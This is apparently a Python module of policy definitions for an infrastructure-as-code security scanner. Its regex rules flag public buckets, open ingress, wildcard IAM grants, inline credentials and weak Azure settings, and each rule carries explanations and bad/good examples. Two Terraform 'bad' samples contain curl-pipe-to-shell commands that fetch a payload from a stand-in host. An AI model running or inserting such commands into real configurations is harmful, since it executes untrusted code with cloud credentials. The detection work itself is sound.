"""The cloud policies: CloudFormation resources, Terraform hygiene, identity and access, and Azure's
native resource types.
"""

from __future__ import annotations

from cordon_scanner.detect.infra.iac_model import IacPolicy
from cordon_scanner.detect.infra.policy_terms import HIGH, LOW, MEDIUM
from cordon_scanner.foundation.models import Category, Confidence, Severity

CFN: tuple[tuple[str, str, str, Severity, Category, str, str, str, str, str], ...] = (
    (
        "PUBLIC_STORAGE",
        "cfn:AWS::S3::Bucket",
        r"AccessControl\"?:\s*Public(?:Read|ReadWrite)",
        HIGH,
        Category.SUSPICIOUS,
        "the bucket is readable by anyone",
        "An `AccessControl` of PublicRead or PublicReadWrite grants the whole "
        "internet access to the objects in this bucket.",
        "Remove the public ACL and serve public content through a CDN origin identity.",
        "    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: PublicRead\n",
        "    Type: AWS::S3::Bucket\n    Properties:\n      AccessControl: Private\n",
    ),
    (
        "PUBLIC_ACCESS",
        "cfn:AWS::RDS::DBInstance",
        r"PubliclyAccessible\"?:\s*(?:true|'true'|\"true\")",
        HIGH,
        Category.SUSPICIOUS,
        "the database is reachable from the public internet",
        "`PubliclyAccessible: true` gives the instance a public address, leaving its "
        "own authentication as the only control in front of the data.",
        "Set `PubliclyAccessible: false` and reach it from inside the VPC.",
        "    Type: AWS::RDS::DBInstance\n    Properties:\n      PubliclyAccessible: true\n",
        "    Type: AWS::RDS::DBInstance\n    Properties:\n      PubliclyAccessible: false\n",
    ),
    (
        "ENCRYPT_AT_REST",
        "cfn:AWS::RDS::DBInstance",
        r"StorageEncrypted\"?:\s*(?:false|'false'|\"false\")",
        HIGH,
        Category.POLICY,
        "storage encryption is switched off",
        "`StorageEncrypted: false` stores the database unencrypted, so a snapshot "
        "copied elsewhere is readable directly.",
        "Set `StorageEncrypted: true`.",
        "    Type: AWS::RDS::DBInstance\n    Properties:\n      StorageEncrypted: false\n",
        "    Type: AWS::RDS::DBInstance\n    Properties:\n      StorageEncrypted: true\n",
    ),
    (
        "OPEN_INGRESS",
        "cfn:AWS::EC2::SecurityGroup",
        r"CidrIp\"?:\s*0\.0\.0\.0/0",
        HIGH,
        Category.SUSPICIOUS,
        "a security group admits the whole internet",
        "An ingress rule with `CidrIp: 0.0.0.0/0` opens the port to every address on "
        "the internet, which is scanned continuously.",
        "Narrow the CIDR to the networks that need it, or front the service with a load balancer.",
        "    Type: AWS::EC2::SecurityGroup\n    Properties:\n      SecurityGroupIngress:\n        - CidrIp: 0.0.0.0/0\n          FromPort: 22\n",
        "    Type: AWS::EC2::SecurityGroup\n    Properties:\n      SecurityGroupIngress:\n        - CidrIp: 10.0.0.0/8\n          FromPort: 22\n",
    ),
    (
        "IAM_WILDCARD",
        "cfn:AWS::IAM::Policy",
        r"Action\"?:\s*(?:'\*'|\"\*\"|\*)\s*$",
        HIGH,
        Category.SUSPICIOUS,
        "the policy grants every action",
        "`Action: '*'` grants every API call the service has. A credential holding it "
        "is equivalent to the account.",
        "Name the actions the principal needs.",
        "    Type: AWS::IAM::Policy\n    Properties:\n      PolicyDocument:\n        Statement:\n          - Effect: Allow\n            Action: '*'\n",
        "    Type: AWS::IAM::Policy\n    Properties:\n      PolicyDocument:\n        Statement:\n          - Effect: Allow\n            Action: s3:GetObject\n",
    ),
    (
        "ENCRYPT_AT_REST",
        "cfn:AWS::EFS::FileSystem",
        r"Encrypted\"?:\s*(?:false|'false'|\"false\")",
        MEDIUM,
        Category.POLICY,
        "the file system is not encrypted",
        "`Encrypted: false` leaves every file readable to anything that reaches the "
        "underlying storage.",
        "Set `Encrypted: true`.",
        "    Type: AWS::EFS::FileSystem\n    Properties:\n      Encrypted: false\n",
        "    Type: AWS::EFS::FileSystem\n    Properties:\n      Encrypted: true\n",
    ),
    (
        "PLAINTEXT",
        "cfn:AWS::ElasticLoadBalancingV2::Listener",
        r"Protocol\"?:\s*HTTP\s*$",
        MEDIUM,
        Category.SUSPICIOUS,
        "the listener serves plain HTTP",
        "Everything the listener carries is readable and modifiable on the path "
        "between the client and it.",
        "Serve HTTPS, keeping HTTP only to redirect.",
        "    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      Protocol: HTTP\n      Port: 80\n",
        "    Type: AWS::ElasticLoadBalancingV2::Listener\n    Properties:\n      Protocol: HTTPS\n      Port: 443\n",
    ),
)

TERRAFORM_HYGIENE: tuple[IacPolicy, ...] = (
    IacPolicy(
        id="SUSPECT.IAC.LOCAL_EXEC.TERRAFORM.001",
        title="A provisioner runs a shell command on the machine applying the plan",
        message=(
            "`local-exec` runs on whoever applies this -- a laptop, or the CI runner "
            "holding the cloud credentials. It is the one part of a plan that is not "
            "a description of infrastructure, and reviewing a plan does not show what "
            "it will do."
        ),
        remediation=(
            "Move the work into the pipeline where it is visible, or into a resource "
            "the provider models. If it must stay, keep the command in a reviewed "
            "script rather than inline."
        ),
        severity=MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("*",),
        forbid=(r"provisioner\s+\"local-exec\"",),
        bad='  name = "example"\n  provisioner "local-exec" {\n    command = "curl https://x.invalid | sh"\n  }\n',
        good='  name = "example"\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.EXTERNAL_PROGRAM.TERRAFORM.001",
        title="A data source runs a local program when the plan is made",
        message=(
            '`data "external"` runs its `program` on the machine making the plan, and '
            "`terraform plan` is what a pull request's CI runs, on the proposed code, with "
            "the credentials the plan needs. Unlike a provisioner it does not wait for an "
            "apply: proposing the change is enough to run it."
        ),
        remediation=(
            "Replace it with a data source the provider models, or move the work into a "
            "reviewed pipeline step. If it must stay, keep the program a reviewed script in "
            "the repository and never run plans of untrusted changes with credentials."
        ),
        severity=MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("data:external",),
        forbid=(r"\bprogram\s*=",),
        bad='  program = ["bash", "-c", "curl -s https://x.invalid/payload | sh"]\n',
        good="  query = {}\n",
    ),
    IacPolicy(
        id="SUSPECT.IAC.CREDENTIALS_INLINE.TERRAFORM.001",
        title="A static credential is written into the configuration",
        message=(
            "An access key written into the configuration is committed, reviewed, "
            "cloned and backed up with it. It cannot be rotated without a code change "
            "and it is readable by everyone who can read the repository."
        ),
        remediation=(
            "Use the provider's environment variables, a shared credentials file, or "
            "workload identity."
        ),
        severity=HIGH,
        confidence=Confidence.MEDIUM,
        category=Category.SUSPICIOUS,
        resources=("*",),
        forbid=(
            r"(?:access_key|secret_key|client_secret|password)\s*=\s*\"[A-Za-z0-9/+=_\-]{12,}\"",
        ),
        # A reference to a variable or a secret store is the remediation.
        unless=(r"=\s*\"?\$\{?var\.", r"=\s*var\.", r"=\s*data\.", r"=\s*local\."),
        bad='  name = "example"\n  secret_key = "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY"\n',
        good='  name = "example"\n  secret_key = var.secret_key\n',
    ),
    IacPolicy(
        id="POLICY.IAC.UNENCRYPTED_STATE.TERRAFORM.001",
        title="The remote state backend does not require encryption",
        message=(
            "Terraform state holds every value the plan touched, including ones "
            "marked sensitive: passwords, keys, tokens, certificates. An unencrypted "
            "backend stores that in the clear."
        ),
        remediation="Set `encrypt = true` on the backend, and restrict who can read the bucket.",
        severity=HIGH,
        confidence=Confidence.HIGH,
        category=Category.POLICY,
        resources=("backend:*",),
        forbid=(r"encrypt\s*=\s*false",),
        bad='  bucket = "state"\n  encrypt = false\n',
        good='  bucket = "state"\n  encrypt = true\n',
    ),
)

IDENTITY: tuple[IacPolicy, ...] = (
    IacPolicy(
        id="SUSPECT.IAC.PUBLIC_IAM.GOOGLE_PROJECT_IAM_MEMBER.001",
        title="google_project_iam_member: a role is granted to everyone",
        message=(
            "`allUsers` and `allAuthenticatedUsers` are not groups you control. A role "
            "bound to either is held by anyone on the internet, or anyone with any "
            "Google account."
        ),
        remediation="Bind the role to a named principal or a group you administer.",
        severity=HIGH,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=(
            "google_project_iam_member",
            "google_project_iam_binding",
            "google_folder_iam_member",
            "google_organization_iam_member",
            "google_cloud_run_service_iam_member",
            "google_cloudfunctions_function_iam_member",
        ),
        forbid=(r"\"all(?:Users|AuthenticatedUsers)\"",),
        bad='  role = "roles/viewer"\n  member = "allUsers"\n',
        good='  role = "roles/viewer"\n  member = "user:someone@example.com"\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.OWNER_ROLE.GOOGLE_PROJECT_IAM_MEMBER.001",
        title="google_project_iam_member: the owner role is granted directly",
        message=(
            "`roles/owner` includes every permission in the project, including "
            "changing the bindings that granted it. A credential holding it cannot be "
            "contained by any other control in the project."
        ),
        remediation="Grant the narrowest predefined role that covers the work, or a custom role.",
        severity=MEDIUM,
        confidence=Confidence.HIGH,
        category=Category.SUSPICIOUS,
        resources=("google_project_iam_member", "google_project_iam_binding"),
        forbid=(r"role\s*=\s*\"roles/owner\"",),
        bad='  role = "roles/owner"\n  member = "user:someone@example.com"\n',
        good='  role = "roles/viewer"\n  member = "user:someone@example.com"\n',
    ),
    IacPolicy(
        id="SUSPECT.IAC.OWNER_ROLE.AZURERM_ROLE_ASSIGNMENT.001",
        title="azurerm_role_assignment: Owner or Contributor is assigned",
        message=(
            "Owner carries every permission in the scope plus the ability to grant it "
            "to others; Contributor carries every permission except that. At "
            "subscription scope either one is the subscription."
        ),
        remediation="Assign a built-in role scoped to the resources the principal works on.",
        severity=MEDIUM,
        confidence=Confidence.MEDIUM,
        category=Category.SUSPICIOUS,
        resources=("azurerm_role_assignment",),
        forbid=(r"role_definition_name\s*=\s*\"(?:Owner|Contributor)\"",),
        bad='  scope = "/subscriptions/x"\n  role_definition_name = "Owner"\n',
        good='  scope = "/subscriptions/x/resourceGroups/rg"\n  role_definition_name = "Reader"\n',
    ),
    IacPolicy(
        id="POLICY.IAC.NO_MFA.AWS_IAM_USER.001",
        title="aws_iam_user: a long-lived user is created",
        message=(
            "An IAM user is a permanent credential that no session policy expires. "
            "Where a role can be assumed with a short-lived token, a user's access key "
            "stays valid until somebody remembers to rotate it."
        ),
        remediation=(
            "Use a role with workload identity or SSO. If a user is unavoidable, "
            "require MFA and rotate its keys on a schedule."
        ),
        severity=LOW,
        confidence=Confidence.MEDIUM,
        category=Category.POLICY,
        resources=("aws_iam_user",),
        forbid=(r"name\s*=",),
        bad='  name = "ci-deploy"\n',
        good="  # replaced by a role assumed through OIDC\n",
    ),
    IacPolicy(
        id="SUSPECT.IAC.WILDCARD_PRINCIPAL.AWS_IAM_POLICY.001",
        title="A resource policy trusts every principal",
        message=(
            '`"Principal": "*"` in a resource policy means any AWS account, and '
            "usually any anonymous caller. Combined with a permissive action it is a "
            "public grant on a private resource."
        ),
        remediation="Name the accounts, roles or services the policy is for.",
        severity=HIGH,
        confidence=Confidence.MEDIUM,
        category=Category.SUSPICIOUS,
        resources=(
            "aws_iam_policy",
            "aws_iam_role_policy",
            "aws_s3_bucket_policy",
            "aws_sqs_queue_policy",
            "aws_sns_topic_policy",
            "aws_kms_key",
            "aws_secretsmanager_secret_policy",
        ),
        forbid=(r"\\?\"Principal\\?\"\s*:\s*\\?\"\*\\?\"",),
        # A wildcard principal narrowed by a condition is how a service-to-service
        # policy is written, and the condition is the control.
        unless=(r"\"Condition\"",),
        bad='  policy = "{\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Principal\\":\\"*\\"}]}"\n',
        good='  policy = "{\\"Statement\\":[{\\"Effect\\":\\"Allow\\",\\"Principal\\":{\\"AWS\\":\\"arn:aws:iam::1:root\\"}}]}"\n',
    ),
)

AZURE_NATIVE: tuple[tuple[str, str, str, str, Severity, Category, str, str, str, str], ...] = (
    (
        "PLAINTEXT",
        "Microsoft.Storage/storageAccounts",
        "supportsHttpsTrafficOnly",
        r"supportsHttpsTrafficOnly\"?\s*:\s*false",
        HIGH,
        Category.SUSPICIOUS,
        "the storage account accepts plain HTTP",
        "Blobs, keys in query strings and everything else the account serves cross "
        "the network readable and modifiable.",
        "Set `supportsHttpsTrafficOnly: true`.",
        "false|true",
    ),
    (
        "WEAK_TLS",
        "Microsoft.Storage/storageAccounts",
        "minimumTlsVersion",
        r"minimumTlsVersion\"?\s*:\s*['\"]TLS1_[01]['\"]",
        MEDIUM,
        Category.POLICY,
        "an obsolete TLS version is accepted",
        "TLS 1.0 and 1.1 are withdrawn and have practical attacks against them.",
        "Set `minimumTlsVersion: 'TLS1_2'`.",
        "'TLS1_0'|'TLS1_2'",
    ),
    (
        "PUBLIC_STORAGE",
        "Microsoft.Storage/storageAccounts",
        "allowBlobPublicAccess",
        r"allowBlobPublicAccess\"?\s*:\s*true",
        HIGH,
        Category.SUSPICIOUS,
        "containers may be made public",
        "With public blob access allowed, any container in the account can be opened "
        "to anonymous readers by a change nobody reviews as infrastructure.",
        "Set `allowBlobPublicAccess: false`.",
        "true|false",
    ),
    (
        "SHARED_KEY_AUTH",
        "Microsoft.Storage/storageAccounts",
        "allowSharedKeyAccess",
        r"allowSharedKeyAccess\"?\s*:\s*true",
        MEDIUM,
        Category.POLICY,
        "the account key authenticates callers",
        "The account key is one credential for everything in the account: it cannot "
        "be scoped, it is not attributable, and it does not expire.",
        "Set `allowSharedKeyAccess: false` and use Entra identities.",
        "true|false",
    ),
    (
        "PUBLIC_ACCESS",
        "Microsoft.*",
        "publicNetworkAccess",
        r"publicNetworkAccess\"?\s*:\s*['\"]Enabled['\"]",
        MEDIUM,
        Category.SUSPICIOUS,
        "the resource answers on a public endpoint",
        "Its own authentication is the only control between an anonymous scanner and "
        "the data behind it, and scanning for exactly this is continuous.",
        "Set `publicNetworkAccess: 'Disabled'` and use a private endpoint.",
        "'Enabled'|'Disabled'",
    ),
    (
        "SHARED_KEY_AUTH",
        "Microsoft.*",
        "disableLocalAuth",
        r"disableLocalAuth\"?\s*:\s*false",
        MEDIUM,
        Category.POLICY,
        "shared-key authentication is enabled",
        "Local authentication is a connection string with an embedded key: it cannot "
        "be scoped, it is not attributable, and it does not expire.",
        "Set `disableLocalAuth: true` and authenticate with a managed identity.",
        "false|true",
    ),
    (
        "PLAINTEXT",
        "Microsoft.Web/sites",
        "httpsOnly",
        r"httpsOnly\"?\s*:\s*false",
        MEDIUM,
        Category.SUSPICIOUS,
        "the site answers plain HTTP",
        "Session cookies, tokens in headers and request bodies are readable and "
        "modifiable on the path.",
        "Set `httpsOnly: true`.",
        "false|true",
    ),
    (
        "PLAINTEXT",
        "Microsoft.Web/sites",
        "ftpsState",
        r"ftpsState\"?\s*:\s*['\"]AllAllowed['\"]",
        MEDIUM,
        Category.SUSPICIOUS,
        "deployment over plain FTP is allowed",
        "`AllAllowed` accepts FTP as well as FTPS, and the deployment credential "
        "crosses the network with it.",
        "Set `ftpsState: 'FtpsOnly'`, or 'Disabled' if nothing deploys over FTP.",
        "'AllAllowed'|'FtpsOnly'",
    ),
    (
        "SHARED_KEY_AUTH",
        "Microsoft.ContainerRegistry/registries",
        "adminUserEnabled",
        r"adminUserEnabled\"?\s*:\s*true",
        MEDIUM,
        Category.SUSPICIOUS,
        "the shared admin account is enabled",
        "One username and password for the whole registry: unscopable, "
        "unattributable, and the credential that ends up in a pipeline variable.",
        "Set `adminUserEnabled: false` and authenticate with an identity.",
        "true|false",
    ),
    (
        "NO_AUTH",
        "Microsoft.ContainerRegistry/registries",
        "anonymousPullEnabled",
        r"anonymousPullEnabled\"?\s*:\s*true",
        HIGH,
        Category.SUSPICIOUS,
        "anyone may pull images from the registry",
        "Images hold application code, build arguments and frequently a credential "
        "somebody baked into a layer.",
        "Set `anonymousPullEnabled: false`.",
        "true|false",
    ),
    (
        "DELETION_PROTECTION",
        "Microsoft.KeyVault/vaults",
        "enablePurgeProtection",
        r"enablePurgeProtection\"?\s*:\s*false",
        MEDIUM,
        Category.POLICY,
        "a deleted vault can be purged immediately",
        "An attacker who can delete can also destroy the recovery path, and so can a mistake.",
        "Set `enablePurgeProtection: true`.",
        "false|true",
    ),
    (
        "DELETION_PROTECTION",
        "Microsoft.KeyVault/vaults",
        "enableSoftDelete",
        r"enableSoftDelete\"?\s*:\s*false",
        MEDIUM,
        Category.POLICY,
        "a deleted secret is gone immediately",
        "There is no window in which a deletion can be reversed, which is the window "
        "an incident response needs.",
        "Set `enableSoftDelete: true`.",
        "false|true",
    ),
    (
        "RBAC",
        "Microsoft.KeyVault/vaults",
        "enableRbacAuthorization",
        r"enableRbacAuthorization\"?\s*:\s*false",
        LOW,
        Category.POLICY,
        "access is governed by vault access policies rather than RBAC",
        "Access policies sit outside the identity model the rest of the subscription "
        "uses, so a review of who can reach this vault has to be done separately and "
        "usually is not.",
        "Set `enableRbacAuthorization: true`.",
        "false|true",
    ),
    (
        "PASSWORD_AUTH",
        "Microsoft.Compute/virtualMachines",
        "disablePasswordAuthentication",
        r"disablePasswordAuthentication\"?\s*:\s*false",
        MEDIUM,
        Category.SUSPICIOUS,
        "SSH password authentication is enabled",
        "A password is guessable at internet scale, and a VM with a public address "
        "receives that traffic continuously.",
        "Set `disablePasswordAuthentication: true` and use SSH keys.",
        "false|true",
    ),
    (
        "OPEN_INGRESS",
        "Microsoft.Network/networkSecurityGroups",
        "sourceAddressPrefix",
        r"sourceAddressPrefix\"?\s*:\s*['\"](?:\*|Internet|0\.0\.0\.0/0)['\"]",
        HIGH,
        Category.SUSPICIOUS,
        "an administrative port is open to the whole internet",
        "A source prefix of `*`, `Internet` or `0.0.0.0/0` on an inbound Allow rule "
        "for SSH, RDP or a database port puts that service's own authentication in "
        "front of the entire internet, which is scanned for continuously.",
        "Name the prefixes that need access, or reach the host through a bastion.",
        "'*'|'10.0.0.0/8'",
    ),
    (
        "NETWORK_DEFAULT_ALLOW",
        "Microsoft.*",
        "defaultAction",
        r"defaultAction\"?\s*:\s*['\"]Allow['\"]",
        MEDIUM,
        Category.SUSPICIOUS,
        "the network rules default to allowing everything",
        "A `networkAcls` block whose default is Allow is a firewall that permits "
        "what it did not consider, which is the opposite of what the block is for.",
        "Set `defaultAction: 'Deny'` and list the networks that may reach it.",
        "'Allow'|'Deny'",
    ),
)


__all__ = ["AZURE_NATIVE", "CFN", "IDENTITY", "TERRAFORM_HYGIENE"]
